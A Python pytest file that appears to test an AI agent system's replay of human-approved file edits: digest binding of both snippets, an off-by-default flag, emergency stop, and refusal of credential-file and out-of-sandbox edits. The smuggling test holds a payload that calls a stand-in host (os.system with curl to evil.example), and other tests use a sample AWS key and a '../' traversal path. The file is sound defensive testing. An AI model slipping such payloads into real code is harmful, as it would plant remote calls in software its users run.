"""Stage 2 slice 4: replaying an EDIT, which is a different claim from a write.

A create says "this file should contain these bytes". An edit says "this exact
snippet should become that exact snippet, in this file". The resulting
whole-file content is not knowable from a compiled step, so an edit cannot be
approved by a whole-file digest without approving it by a value that does not
describe it.

The failure these tests exist to prevent: binding the approval to the
REPLACEMENT only. That would let an approved `new_string` be applied over a
different `old_string` -- a different edit, to a different part of the file,
wearing an approval it never received.
"""

from __future__ import annotations

import hashlib
from pathlib import Path

import pytest

from aios import config
from aios.core.cerebellum import Cerebellum, PlaybookStep, _parse_step
from aios.core.replay_writes import (
    content_digest,
    edit_signature,
    is_approved_edit,
    record_edit_approval,
    store_content,
)
from aios.memory.db import init_memory_db
from aios.security import scope_lock

_OLD = "return a + b"
_NEW = "return a - b"
_OLD_D = hashlib.sha256(_OLD.encode()).hexdigest()
_NEW_D = hashlib.sha256(_NEW.encode()).hexdigest()
_FILE = "calc.py"
_BODY = "def add(a, b):\n    " + _OLD + "\n"


@pytest.fixture()
def db_path(tmp_path) -> Path:
    p = tmp_path / "slice4.db"
    init_memory_db(p)
    return p


@pytest.fixture()
def sandbox(tmp_path, monkeypatch) -> Path:
    root = tmp_path / "sandbox"
    root.mkdir()
    monkeypatch.setattr(scope_lock, "_SCOPE_LOCK", scope_lock.ScopeLockAuthority())
    scope_lock.set_scope_roots([root])
    return root


def _edit_step(path: str = _FILE) -> PlaybookStep:
    return PlaybookStep(
        "edit_file",
        {"filepath": path, "old_sha256": _OLD_D, "new_sha256": _NEW_D},
    )


# --------------------------------------------------------------------------- #
# Recording and compiling
# --------------------------------------------------------------------------- #


def test_the_recorder_and_the_parser_agree_on_edits() -> None:
    """The seam that has drifted before, checked for the edit shape too."""
    from aios.api.turn_pipeline import _workflow_step

    recorded = _workflow_step(
        {
            "tool": "edit_file",
            "input": {"filepath": _FILE, "old_string": _OLD, "new_string": _NEW},
        }
    )
    step = _parse_step(recorded)

    assert step is not None, "the parser cannot read what the recorder writes"
    assert step.args["filepath"] == _FILE
    assert step.args["old_sha256"] == _OLD_D
    assert step.args["new_sha256"] == _NEW_D


def test_an_edit_without_digests_stays_uncompilable() -> None:
    """A step recorded before edit digests existed replays nothing."""
    assert _parse_step("edit_file: filepath=calc.py") is None
    assert _parse_step(f"edit_file: filepath=calc.py, old_sha256={_OLD_D}") is None


def test_both_digests_are_taken_off_the_end() -> None:
    """A comma inside a filepath must not split the step."""
    step = _parse_step(
        f"edit_file: filepath=a,b.py, old_sha256={_OLD_D}, new_sha256={_NEW_D}"
    )

    assert step is not None
    assert step.args["filepath"] == "a,b.py"


# --------------------------------------------------------------------------- #
# The decision binds BOTH sides
# --------------------------------------------------------------------------- #


def test_the_replacement_alone_does_not_identify_the_edit() -> None:
    """THE BAR for this slice.

    Same file, same approved replacement, DIFFERENT original. If the key
    committed only the replacement, this would collide and an approval for one
    edit would authorise another.
    """
    a = edit_signature(_FILE, _OLD_D, _NEW_D, workspace="ws")
    b = edit_signature(_FILE, content_digest("something else"), _NEW_D, workspace="ws")

    assert a != b, "an approval for one edit would authorise a different one"


def test_an_approved_edit_does_not_authorise_the_same_change_elsewhere(db_path):
    """Path is committed too, so an approval does not travel between files."""
    record_edit_approval(_FILE, _OLD, _NEW, db_path=db_path)

    assert is_approved_edit(_FILE, _OLD_D, _NEW_D, db_path=db_path, enabled=True)
    assert not is_approved_edit(
        "other.py", _OLD_D, _NEW_D, db_path=db_path, enabled=True
    )


def test_a_secret_in_either_snippet_prevents_the_record(db_path):
    """A half-stored edit is unreplayable, so neither half is recorded.

    Recording anyway would leave an approval whose other side cannot be found,
    and a replay would have to decide what to do with half a transformation.
    """
    secret = 'AWS_SECRET_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"'

    result = record_edit_approval(_FILE, _OLD, secret, db_path=db_path)

    assert result.stored is False
    assert not is_approved_edit(
        _FILE, _OLD_D, content_digest(secret), db_path=db_path, enabled=True
    )


def test_the_edit_flag_is_off_by_default(db_path):
    record_edit_approval(_FILE, _OLD, _NEW, db_path=db_path)

    assert config.REPLAY_APPROVED_WRITES_ENABLED is False
    assert not is_approved_edit(_FILE, _OLD_D, _NEW_D, db_path=db_path)


def test_an_engaged_emergency_stop_denies_an_edit(db_path):
    record_edit_approval(_FILE, _OLD, _NEW, db_path=db_path)

    class _Engaged:
        def assert_operational(self):
            raise RuntimeError("stopped")

    assert not is_approved_edit(
        _FILE, _OLD_D, _NEW_D, db_path=db_path, enabled=True, emergency_stop=_Engaged()
    )


# --------------------------------------------------------------------------- #
# Confirming an edit against the file on disk
# --------------------------------------------------------------------------- #


def test_an_already_applied_edit_confirms_without_writing(db_path, sandbox):
    """Replacement present, original gone -> nothing left to do."""
    target = sandbox / _FILE
    target.write_text("def add(a, b):\n    " + _NEW + "\n", encoding="utf-8")
    before = target.stat().st_mtime_ns
    store_content(_OLD, db_path=db_path)
    store_content(_NEW, db_path=db_path)

    outcome = Cerebellum(db_path)._confirm_edit(_edit_step())

    assert outcome.confirmed is True
    assert "no write" in outcome.detail
    assert target.stat().st_mtime_ns == before


def test_an_applicable_edit_is_marked_applicable(db_path, sandbox):
    target = sandbox / _FILE
    target.write_text(_BODY, encoding="utf-8")
    store_content(_OLD, db_path=db_path)
    store_content(_NEW, db_path=db_path)

    outcome = Cerebellum(db_path)._confirm_edit(_edit_step())

    assert outcome.confirmed is False
    assert outcome.missing is True
    assert outcome.permanent is False


def test_a_file_matching_neither_side_abstains(db_path, sandbox):
    """Not applicable, and not proof the playbook is bad -- so not permanent."""
    (sandbox / _FILE).write_text("def add(a, b):\n    return 0\n", encoding="utf-8")
    store_content(_OLD, db_path=db_path)
    store_content(_NEW, db_path=db_path)

    outcome = Cerebellum(db_path)._confirm_edit(_edit_step())

    assert outcome.confirmed is False
    assert outcome.missing is False
    assert outcome.permanent is False


def test_an_edit_to_a_credential_path_is_permanently_refused(db_path, sandbox):
    """`.env` is in scope, so scope alone would allow the comparison.

    Comparing snippets against a credential file is a content oracle just as a
    whole-file digest comparison is -- partial matching leaks the same way.
    """
    (sandbox / ".env").write_text("KEY=abc\n", encoding="utf-8")

    outcome = Cerebellum(db_path)._confirm_edit(_edit_step(".env"))

    assert outcome.confirmed is False
    assert outcome.permanent is True


def test_an_edit_outside_the_sandbox_is_permanently_refused(db_path, sandbox):
    outcome = Cerebellum(db_path)._confirm_edit(_edit_step("../escape.py"))

    assert outcome.confirmed is False
    assert outcome.permanent is True


# --------------------------------------------------------------------------- #
# The dispatcher
# --------------------------------------------------------------------------- #


def _agent(sandbox: Path):
    from aios.agents.tool_agent import ToolAgent
    from aios.core.executor import Executor

    class _Runner:
        def run(self, *a, **k):
            raise AssertionError("no command should run in these tests")

    agent = ToolAgent(
        None,
        Executor(runner=_Runner(), audit_log=lambda *a, **k: None),
        read_root=sandbox,
    )
    agent.autonomy = None
    return agent


def test_an_unapproved_edit_is_blocked(db_path, sandbox, monkeypatch):
    """Snippets being available is not permission to apply them."""
    target = sandbox / _FILE
    target.write_text(_BODY, encoding="utf-8")
    store_content(_OLD, db_path=db_path)
    store_content(_NEW, db_path=db_path)
    monkeypatch.setattr(config, "MEMORY_DB_PATH", db_path)
    monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)

    output, status, _ = _agent(sandbox)._replay_edit_file(
        {
            "filepath": _FILE,
            "old_string": _OLD,
            "new_string": _NEW,
            "old_sha256": _OLD_D,
            "new_sha256": _NEW_D,
        }
    )

    assert status == "blocked"
    assert "no human has approved" in output
    assert target.read_text(encoding="utf-8") == _BODY, "an unapproved edit applied"


def test_an_approved_edit_is_applied(db_path, sandbox, monkeypatch):
    target = sandbox / _FILE
    target.write_text(_BODY, encoding="utf-8")
    record_edit_approval(_FILE, _OLD, _NEW, db_path=db_path)
    monkeypatch.setattr(config, "MEMORY_DB_PATH", db_path)
    monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)

    _, status, failed = _agent(sandbox)._replay_edit_file(
        {
            "filepath": _FILE,
            "old_string": _OLD,
            "new_string": _NEW,
            "old_sha256": _OLD_D,
            "new_sha256": _NEW_D,
        }
    )

    assert failed is False
    assert status in ("ok", "noop")
    assert _NEW in target.read_text(encoding="utf-8")


def test_snippets_that_do_not_match_their_digests_cannot_smuggle_text(
    db_path, sandbox, monkeypatch
):
    """The slice 2 hole, checked on the edit path before it could exist.

    The lookup is by digest, so an approved digest pair carrying arbitrary
    replacement text would apply text nobody approved -- through the audited,
    snapshotted path.
    """
    target = sandbox / _FILE
    target.write_text(_BODY, encoding="utf-8")
    record_edit_approval(_FILE, _OLD, _NEW, db_path=db_path)
    monkeypatch.setattr(config, "MEMORY_DB_PATH", db_path)
    monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)

    evil = "import os; os.system('curl evil.example')"
    _, status, _ = _agent(sandbox)._replay_edit_file(
        {
            "filepath": _FILE,
            "old_string": _OLD,
            "new_string": evil,  # not what the digest describes
            "old_sha256": _OLD_D,
            "new_sha256": _NEW_D,
        }
    )

    assert status == "blocked"
    assert evil not in target.read_text(encoding="utf-8")
